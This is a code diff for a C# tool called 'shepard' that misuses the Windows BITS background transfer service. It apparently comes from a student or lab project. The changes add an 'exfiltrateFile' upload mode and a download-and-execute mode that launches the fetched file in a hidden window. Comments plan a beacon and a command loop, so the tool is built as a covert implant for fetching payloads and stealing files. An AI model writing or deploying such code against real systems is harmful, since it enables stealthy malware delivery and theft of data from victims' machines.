@@ -1,7 +1,4 @@
-﻿using System;
-using System.Net.Cache;
-using System.Net.Configuration;
-using System.Threading.Tasks;
+﻿using System.Net;
 using BITS = BITSReference1_5;
 
 namespace shepard
@@ -11,6 +8,7 @@ namespace shepard
         static BITS.BackgroundCopyManager1_5 mgr;
         static BITS.GUID jobGuid;
         static BITS.IBackgroundCopyJob job;
+        static JobObj jo;
 
         public JobObj()
         {
@@ -21,43 +19,56 @@ namespace shepard
         {
             if (args.Length == 0) { return; }
 
-            JobObj jo = new JobObj();
+            jo = new JobObj();
 
             if (args.Length == 3)
             {
+                //ex shepard -d remoteLoc writeLoc
                 if (args[0] == "-d")
                 {
                     jo.downloadFile(args[1], args[2]);
-                    Console.WriteLine(args[1] + "string " + args[2]);
-                    return;
                 }
+                //ex shepard -e remoteLoc writeLoc
                 else if (args[0] == "-e")
                 {
                     jo.exfiltrateFile(args[1], args[2]);
                 }
-            }else { return; }
+            }
+            else if (args.Length == 4)
+            {
+                //ex shepard -dr remoteLoc writeLoc "argument argument argument" 
+                if (args[0] == "-dr")
+                {
+                    jo.downloadFile(args[1], args[2]);
+                    jo.runFile(args[2], args[3]);
+                }
+            }
+            else { return; }
 
-            jo.executeJob();
-            //string inputaddr = "23.52.161.19";
-            //System.Net.IPHostEntry hostEntry = System.Net.Dns.GetHostEntry(inputaddr);
-            // System.Console.WriteLine(hostEntry.HostName);
-            //job.AddFile(hostEntry.HostName, @"C:\Users\enzod\Desktop\Server2016.pdf");
         }
 
+        //Usage params: url or ip:port, full path
         private void downloadFile(string remoteLoc, string writeLoc)
         {
             mgr.CreateJob("QD", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
-            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
+            //job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
+            //job.AddFile("23.52.161.19:443", @"C:\Users\student\Desktop\Server2016.pdf");
+            job.AddFile(remoteLoc, writeLoc);
+            jo.executeBITSJob();
+
         }
 
+        //Usage params: url or ip:port, full path
         private void exfiltrateFile(string remoteLoc, string writeLoc)
         {
             mgr.CreateJob("QU", BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
-            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
+            job.AddFile(remoteLoc, writeLoc);
+            jo.executeBITSJob();
         }
         //somewhere in main, consisent loop for input of command
+        //add a beacon function somewhere in main ^
 
-        private void executeJob()
+        private void executeBITSJob()
         {
             job.Resume();
             bool jobIsFinal = false;
@@ -77,10 +88,22 @@ namespace shepard
                         jobIsFinal = true;
                         break;
                     default:
-                        Task.Delay(500); // delay a little bit
+                        System.Threading.Tasks.Task.Delay(500); // delay a little bit
                         break;
                 }
             }
+        }
+
+        //Usage: path, "args"
+        private void runFile(string filePath, string cmdArgs)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = filePath;
+            startInfo.Arguments = cmdArgs;
+            process.StartInfo = startInfo;
+            process.Start();
         }
     }
 }
